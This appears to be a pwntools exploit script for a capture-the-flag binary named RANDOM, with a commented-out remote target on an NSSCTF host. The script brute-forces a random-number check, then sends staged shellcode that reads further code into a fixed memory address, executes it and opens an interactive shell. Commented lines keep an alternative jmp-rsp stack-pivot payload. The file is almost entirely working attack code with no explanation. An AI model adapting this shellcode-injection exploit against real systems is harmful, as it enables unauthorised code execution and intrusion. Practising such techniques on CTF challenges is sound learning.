from pwn import *
import random
#context.log_level = 'debug'
context.binary = './RANDOM'
context(os = 'linux', arch = 'amd64')
io = process("./RANDOM")
#io = remote('node1.anna.nssctf.cn', 28351)
elf = ELF("./RANDOM")
io.recvline()
while True:
	i = random.randint(0,49)
	#print i
	io.sendline(str(i))

	data = io.recvline()
	#print data
	sleep(0.1)
	if 'good' in data:
		print 'over over'
		break

jmp_rsp = 0x40094e
sub_rsp_jmp = asm('sub rsp, 0x30;jmp rsp')
#shellcode = asm(shellcraft.sh())

mmp = 0x7ffff7ffe000

payload = asm(shellcraft.read(0, mmp, 500)) + asm("mov rax,0x7ffff7ffe000;call rax")
print len(payload)
io.sendafter('door', payload)


#print len(shellcode)
#payload  = shellcode.ljust(0x20, 'A')
#payload += 'deadbeef'
#payload += p64(jmp_rsp)
#payload += sub_rsp_jmp


io.interactive()